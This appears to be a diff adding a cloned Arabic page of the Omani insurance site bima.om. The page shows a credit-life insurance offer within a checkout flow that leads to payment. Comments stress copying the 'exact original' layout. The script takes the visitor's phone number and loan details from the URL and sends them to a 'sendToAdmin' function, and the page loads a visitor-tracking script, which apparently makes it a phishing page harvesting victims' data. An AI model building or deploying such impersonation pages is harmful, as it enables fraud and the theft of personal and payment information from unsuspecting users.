@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بيمة</title>
+    <!-- removed external CSS to avoid conflicts -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        :root {
+            --theme-default5: #5eac12;
+            --theme-default5_2: #80c739;
+            --theme-default5_3: #c5dfab;
+            --theme-default5_light1: #f2f9f2;
+            --theme-gradient5: linear-gradient(to right, var(--theme-default5) 0%, var(--theme-default5_2) 51%, var(--theme-default5_2) 100%);
+            --sm-size: 24px;
+            --sm-line-thickness: 1px;
+            --sm-color-muted: #d7dbe1;
+            --sm-color-text: #1f2937;
+            --sm-color-label: #4b5563;
+            --sm-color-active: #5eac12;
+            --sm-color-done: #c5dfab;
+            --sm-color-bg: #ffffff;
+            --sm-gap: 15px;
+            --bs-highlight-bg: #fff3cd;
+            --bs-carousel-caption-color: #fff;
+        }
+        body {
+            font-family: 'Tajawal Regular', sans-serif;
+            direction: rtl;
+            margin: 0;
+            background: #fff;
+            color: #586167;
+        }
+
+        /* Header */
+        header.header-1 {
+            border-bottom: 1px solid #eee;
+            background: #fff;
+            position: sticky;
+            top: 0;
+            z-index: 9;
+            padding: 10px 0;
+        }
+        .header-inner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+        .brand-logo img {
+            height: 50px;
+        }
+        .nav-menu {
+            display: flex;
+            gap: 30px;
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            align-items: center;
+        }
+        .nav-menu a {
+            text-decoration: none;
+            color: #333;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        .nav-icons {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+        .nav-icons a {
+            color: #5eac12;
+            font-size: 1.3rem;
+            text-decoration: none;
+        }
+
+        /* Page Header - matches original */
+        .page-header {
+            background: radial-gradient(circle, var(--bs-highlight-bg) 0%, var(--bs-carousel-caption-color) 100%);
+            padding: 20px 0 15px;
+        }
+        .page-heading-1 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: var(--theme-default5);
+            margin: 0;
+        }
+
+        /* Stepper - exact original styles */
+        .sm-stepper {
+            display: flex;
+            flex-wrap: nowrap;
+            justify-content: center;
+            align-items: flex-start;
+            width: 100%;
+            max-width: 100%;
+            position: relative;
+            box-sizing: border-box;
+            gap: var(--sm-gap);
+            overflow-x: auto;
+            overflow-y: hidden;
+            isolation: isolate;
+        }
+        .sm-stepper__item {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            flex: 0 0 auto;
+            min-inline-size: clamp(100px, 25vw, 140px);
+            z-index: 1;
+        }
+        .sm-stepper__item:before,
+        .sm-stepper__item:after {
+            content: "";
+            position: absolute;
+            top: calc(var(--sm-size) / 2);
+            height: var(--sm-line-thickness);
+            background-color: var(--sm-color-done);
+            pointer-events: none;
+            z-index: -1;
+        }
+        .sm-stepper__item:before {
+            inset-inline-end: calc(50% + var(--sm-size) / 2);
+            width: calc(50% - var(--sm-size) / 2 + var(--sm-gap) / 2);
+        }
+        .sm-stepper__item:after {
+            inset-inline-start: calc(50% + var(--sm-size) / 2);
+            width: calc(50% - var(--sm-size) / 2 + var(--sm-gap) / 2);
+        }
+        .sm-stepper__item:first-child:before {
+            display: none;
+        }
+        .sm-stepper__item:last-child:after {
+            display: none;
+        }
+        .sm-stepper__link,
+        .sm-stepper__link:visited {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-decoration: none;
+            color: inherit;
+        }
+        .sm-stepper__circle {
+            width: var(--sm-size);
+            height: var(--sm-size);
+            border-radius: 50%;
+            background: var(--sm-color-bg);
+            border: 1px solid var(--sm-color-done);
+            display: grid;
+            place-items: center;
+            color: var(--sm-color-text);
+            font-weight: 400;
+            font-size: 16px;
+            position: relative;
+            z-index: 1;
+        }
+        .sm-stepper__item.sm-is-done .sm-stepper__circle {
+            background: var(--sm-color-done);
+            border-color: var(--sm-color-done);
+            color: var(--sm-color-active);
+        }
+        .sm-stepper__item[aria-current="step"] .sm-stepper__circle {
+            background: var(--sm-color-active);
+            border-color: var(--sm-color-active);
+            color: #fff;
+        }
+        .sm-stepper__label {
+            margin-top: 4px;
+            font-size: 16px;
+            color: var(--sm-color-label);
+        }
+        .sm-stepper__item[aria-current="step"] .sm-stepper__label {
+            color: var(--sm-color-active);
+        }
+
+        /* Summary Info Bar */
+        .summary-info-bar {
+            background: #f8f9fa;
+            border-bottom: 1px solid #eee;
+            padding: 10px 0;
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+        }
+
+        /* Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+        .row {
+            display: flex;
+            flex-wrap: wrap;
+        }
+
+        /* Left Sidebar */
+        .col-sidebar {
+            width: 261px;
+            flex-shrink: 0;
+            position: sticky;
+            top: 80px;
+        }
+        .col-main {
+            flex: 1;
+            padding-right: 20px;
+        }
+        .advanced-search-panel__header {
+            margin-bottom: 10px;
+        }
+        .advanced-search-panel__title {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #333;
+        }
+        .advanced-search-panel__section-title {
+            font-size: 0.95rem;
+            color: var(--theme-default5);
+            font-weight: 600;
+            margin: 12px 0 8px;
+        }
+        .company-filter-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 8px 0;
+            cursor: pointer;
+        }
+        .company-filter-item input[type="checkbox"] {
+            accent-color: var(--theme-default5);
+            width: 18px;
+            height: 18px;
+        }
+
+        /* Quote Card - matches original */
+        .quote-card {
+            background: #fff;
+            border: 1px solid #eee;
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 20px;
+        }
+        .quote-card__header {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            flex-direction: row-reverse;
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+        .quote-card__logo {
+            width: 50px;
+            height: 50px;
+            object-fit: contain;
+        }
+        .quote-card__company-name {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #333;
+            margin: 0;
+        }
+        .quote-card__badge {
+            display: inline-flex;
+            flex-direction: column;
+            align-items: center;
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 10px;
+            padding: 8px 18px;
+            font-size: 0.85rem;
+            margin-bottom: 15px;
+            float: right;
+            clear: right;
+        }
+        .quote-card__badge-title {
+            color: #666;
+            font-size: 0.8rem;
+        }
+        .quote-card__badge-value {
+            color: var(--theme-default5);
+            font-weight: 600;
+        }
+
+        /* Sections inside card */
+        .quote-card__section-title {
+            font-size: 1.05rem;
+            font-weight: 700;
+            color: #333;
+            margin: 20px 0 10px;
+            text-align: right;
+            clear: both;
+        }
+        .quote-card__check-item {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            flex-direction: row-reverse;
+            gap: 8px;
+            padding: 4px 0;
+            font-size: 0.9rem;
+            color: #333;
+        }
+        .quote-card__check-item .check-icon {
+            color: #fff;
+            background: var(--theme-default5);
+            width: 20px;
+            height: 20px;
+            border-radius: 4px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.7rem;
+            flex-shrink: 0;
+        }
+
+        /* Price button and actions */
+        .quote-card__footer {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 25px;
+            flex-direction: row-reverse;
+        }
+        .btn-buy {
+            background-image: var(--theme-gradient5);
+            background-size: 200% auto;
+            color: #fff;
+            border: none;
+            padding: 14px 30px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+            transition: all 0.5s ease;
+        }
+        .btn-buy:hover {
+            background-position: right center;
+        }
+        .btn-buy .price-currency {
+            font-size: 0.85rem;
+        }
+        .btn-buy .price-amount {
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+        .btn-buy .price-label {
+            font-size: 0.85rem;
+        }
+        .action-links {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            font-size: 0.9rem;
+        }
+        .action-links a {
+            color: var(--theme-default5);
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        .action-links .sep {
+            color: #ccc;
+        }
+
+        /* Back button - exact original */
+        .section-page-footer-1 {
+            display: flex;
+            justify-content: flex-end;
+            padding: 15px 0;
+            margin: 10px 0;
+        }
+        .btn.btn-gradient.color-2 {
+            background-image: var(--theme-gradient5);
+            background-size: 200% auto;
+            color: #fff;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 8px;
+            font-size: 13px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 500;
+            position: relative;
+            transition: all 0.5s ease;
+        }
+        .btn.btn-gradient.color-2:hover {
+            background-position: right center;
+        }
+
+        /* Footer */
+        footer .sub-footer {
+            padding: 12px 0;
+            background: #2d2d2d;
+        }
+        footer .sub-footer .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        footer .sub-footer p {
+            font-size: 14px;
+            font-weight: 500;
+            color: #d2d2d2;
+            margin: 0;
+        }
+        .sub-footer-link {
+            display: flex;
+            gap: 10px;
+            list-style: none;
+            margin: 0;
+            padding: 0;
+        }
+        .sub-footer-link li + li {
+            margin-right: 10px;
+        }
+        .sub-footer-link li a {
+            color: #d2d2d2;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .sub-footer-link li a:hover {
+            color: #fff;
+        }
+
+        @media (max-width: 991px) {
+            .col-sidebar {
+                display: none;
+            }
+            .col-main {
+                padding-right: 0;
+            }
+        }
+    </style>
+</head>
+<body class="rtl">
+    <!-- Header - exact original structure -->
+    <header class="header-1">
+        <div class="header-inner">
+            <a href="/" class="brand-logo">
+                <img alt="logo" class="img-fluid" src="/assets/images/logo/bima-logo.png">
+            </a>
+            <ul class="nav-menu">
+                <li><a href="https://bima.om/">الصفحة الرئيسية</a></li>
+                <li><a href="#">تأمين ▾</a></li>
+                <li><a href="javascript:void(0)" style="pointer-events:none;opacity:0.5;cursor:default;">تتبع الطلب</a></li>
+            </ul>
+            <div class="nav-icons">
+                <a href="tel:+96879997797"><i class="fa-solid fa-headset"></i></a>
+                <a href="#"><i class="fa-solid fa-globe"></i></a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Page Header with Stepper - exact original -->
+    <div id="page-header" class="page-header">
+        <div class="container" style="padding: 0;">
+            <div class="row" style="align-items: center;">
+                <div style="flex: 1; text-align: center;">
+                    <h1 class="page-heading-1">تأمين على حياة المقترض</h1>
+                </div>
+                <div style="flex: 1; display: flex; align-items: center; justify-content: center; padding: 10px 0;">
+                    <div class="sm-stepper" aria-label="Checkout progress">
+                        <div class="sm-stepper__item sm-is-done">
+                            <a class="sm-stepper__link">
+                                <span class="sm-stepper__circle">1</span>
+                                <span class="sm-stepper__label">التفاصيل</span>
+                            </a>
+                        </div>
+                        <div class="sm-stepper__item" aria-current="step">
+                            <a class="sm-stepper__link">
+                                <span class="sm-stepper__circle" style="background: var(--sm-color-active); border-color: var(--sm-color-active); color: #fff;">2</span>
+                                <span class="sm-stepper__label" style="color: var(--sm-color-active);">العروض</span>
+                            </a>
+                        </div>
+                        <div class="sm-stepper__item">
+                            <a class="sm-stepper__link">
+                                <span class="sm-stepper__circle">3</span>
+                                <span class="sm-stepper__label">مراجعة</span>
+                            </a>
+                        </div>
+                        <div class="sm-stepper__item">
+                            <a class="sm-stepper__link">
+                                <span class="sm-stepper__circle">4</span>
+                                <span class="sm-stepper__label">الدفع</span>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Summary Info Bar -->
+    <div class="summary-info-bar">
+        <div class="container">
+            <span>رقم الاتصال: <span id="infoMobile">67898789</span></span>
+            <span style="margin: 0 5px;">|</span>
+            <span>نوع الطلب: الحياة الائتمانية</span>
+            <span style="margin: 0 5px;">|</span>
+            <span id="infoLoanType">قرض شخصي</span>
+            <span style="margin: 0 5px;">|</span>
+            <span>مبلغ القرض: <span id="infoLoanAmount">50,000</span></span>
+            <span style="margin: 0 5px;">|</span>
+            <span>مدة القرض بالاشهر: <span id="infoTenure">17</span></span>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container" style="margin-top: 25px; margin-bottom: 25px;">
+        <div class="row">
+            <!-- Left Sidebar -->
+            <div class="col-sidebar">
+                <div class="advanced-search-panel">
+                    <div class="advanced-search-panel__header">
+                        <div class="advanced-search-panel__title">بحث متقدم</div>
+                    </div>
+                    <div class="advanced-search-panel__section-title">شركات التأمين</div>
+                    <label class="company-filter-item">
+                        <input type="checkbox" checked>
+                        <span>تكافل عُمان</span>
+                    </label>
+                </div>
+            </div>
+
+            <!-- Offers Area -->
+            <div class="col-main">
+                <div class="quote-card">
+                    <!-- Company Header -->
+                    <div class="quote-card__header">
+                        <h3 class="quote-card__company-name">تكافل عُمان</h3>
+                        <img src="/assets/images/ins/takaful_oman.jpg" alt="تكافل عُمان" class="quote-card__logo">
+                    </div>
+
+                    <!-- Badge -->
+                    <div class="quote-card__badge">
+                        <span class="quote-card__badge-title">الملاحق/الإضافات</span>
+                        <span class="quote-card__badge-value">Instant 🚀</span>
+                    </div>
+
+                    <!-- Coverage -->
+                    <h4 class="quote-card__section-title">يشمل التغطيات</h4>
+                    <div class="quote-card__check-item">
+                        <span>الوفاة لأي سبب كان</span>
+                        <span class="check-icon">✓</span>
+                    </div>
+                    <div class="quote-card__check-item">
+                        <span>العجز الكلي الدائم الناتج عن حادث أو مرض بنسبة 75% أو أكثر (تغطية حتى سن 65)</span>
+                        <span class="check-icon">✓</span>
+                    </div>
+
+                    <!-- Medical Tests -->
+                    <h4 class="quote-card__section-title">الفحوصات الطبية المطلوبة</h4>
+                    <div class="quote-card__check-item">
+                        <span>creditLife.medicalTests.LAB2_CBC_HBA1C_FASTI</span>
+                        <span class="check-icon">✓</span>
+                    </div>
+                    <div class="quote-card__check-item">
+                        <span>تقرير الفحص الطبي (بما في ذلك تحليل البول المجهري)</span>
+                        <span class="check-icon">✓</span>
+                    </div>
+                    <div class="quote-card__check-item">
+                        <span>تخطيط كهربائية القلب</span>
+                        <span class="check-icon">✓</span>
+                    </div>
+                    <div class="quote-card__check-item">
+                        <span>مستند خاص بالغدة البروستاتية (فحص للكشف عن مشاكل البروستاتا)</span>
+                        <span class="check-icon">✓</span>
+                    </div>
+
+                    <!-- Documents -->
+                    <h4 class="quote-card__section-title">المستندات المطلوبة</h4>
+                    <div class="quote-card__check-item">
+                        <span>نموذج الطلب الموحد</span>
+                        <span class="check-icon">✓</span>
+                    </div>
+
+                    <!-- Footer with price and actions -->
+                    <div class="quote-card__footer">
+                        <a href="/insurance/credit-life-detail.html" class="btn-buy" id="buyBtn">
+                            <span class="price-old" id="priceOld" style="text-decoration: line-through; color: #ff0000; font-size: 0.85rem; margin-left: 8px;">73.78</span>
+                            <span class="price-currency">ع.ر</span>
+                            <span class="price-amount" id="priceAmount">55.34</span>
+                            <span class="price-label">إشتري الآن</span>
+                        </a>
+                        <div class="action-links">
+                            <a href="#">عرض السعر</a>
+                            <span class="sep">|</span>
+                            <a href="#">⊕ عرض المزيد</a>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Back Button -->
+                <div class="section-page-footer-1" style="display: flex; justify-content: flex-start;">
+                    <a href="/insurance/credit-life-form" class="btn btn-gradient color-2">
+                        السابق <i class="fas fa-arrow-right" style="margin-right: 5px;"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer - exact original -->
+    <footer>
+        <div class="sub-footer">
+            <div class="container">
+                <p>حقوق الطبع والنشر © 2026, جميع الحقوق محفوظة</p>
+                <ul class="sub-footer-link">
+                    <li><a href="https://bima.om/">الصفحة الرئيسية</a></li>
+                    <li><a href="https://bima.om/Home/Terms">شروط</a></li>
+                    <li><a href="https://bima.om/Home/PrivacyPolicy">سياسة الخصوصية</a></li>
+                    <li><a href="https://bima.om/Home/ContactUs">اتصال</a></li>
+                </ul>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        var params = new URLSearchParams(window.location.search);
+        var loanAmount = parseFloat(params.get('loan_amount')) || 50000;
+        var loanTenure = params.get('loan_tenure') || '17';
+        var mobile = params.get('mobile') || '67898789';
+
+        // Parse tenure
+        var tenureMonths = 0;
+        if (loanTenure.includes('Year') || loanTenure.includes('Month')) {
+            var yearsMatch = loanTenure.match(/(\d+)\s*Year/i);
+            var monthsMatch = loanTenure.match(/(\d+)\s*Month/i);
+            tenureMonths = (yearsMatch ? parseInt(yearsMatch[1]) * 12 : 0) + (monthsMatch ? parseInt(monthsMatch[1]) : 0);
+        } else {
+            tenureMonths = parseInt(loanTenure) || 17;
+        }
+
+        var tenureYears = tenureMonths / 12;
+
+        // Premium calculation
+        var ratePerThousand = 0.88;
+        var premium = (loanAmount / 1000) * ratePerThousand * tenureYears;
+        premium = Math.round(premium * 100) / 100;
+
+        // Apply 25% discount
+        var discountedPremium = premium * 0.75;
+        discountedPremium = Math.round(discountedPremium * 100) / 100;
+
+        // Update displays
+        document.getElementById('priceOld').textContent = premium.toFixed(2);
+        document.getElementById('priceAmount').textContent = discountedPremium.toFixed(2);
+        document.getElementById('infoMobile').textContent = mobile.replace('%2B', '+');
+        document.getElementById('infoLoanAmount').textContent = loanAmount.toLocaleString();
+        document.getElementById('infoTenure').textContent = tenureMonths;
+
+        // Update loan type from params
+        var loanType = params.get('loan_type') || 'شخصي';
+        document.getElementById('infoLoanType').textContent = 'قرض ' + loanType;
+
+        // Update buy button link with discounted amount
+        var buyUrl = '/insurance/credit-life-detail.html?amount=' + discountedPremium.toFixed(2);
+        document.getElementById('buyBtn').href = buyUrl;
+        // Send to admin on buy click
+        document.getElementById('buyBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            if (window.sendToAdmin) {
+                window.sendToAdmin({
+                    'شركة التأمين': 'ليفا للتأمين',
+                    'السعر': discountedPremium.toFixed(2) + ' ر.ع',
+                    'السعر الأساسي': premium.toFixed(2) + ' ر.ع',
+                    'مبلغ القرض': loanAmount,
+                    'مدة القرض': tenureMonths + ' شهر',
+                    'رقم الهاتف': mobile.replace('%2B', '+'),
+                    'الحالة': 'تم اختيار العرض'
+                }, 'تأمين القروض - العروض');
+            }
+            window.location.href = buyUrl;
+        });
+    });
+    </script>
+<script src="../visitor-tracking.js"></script>
+</body>
+</html>
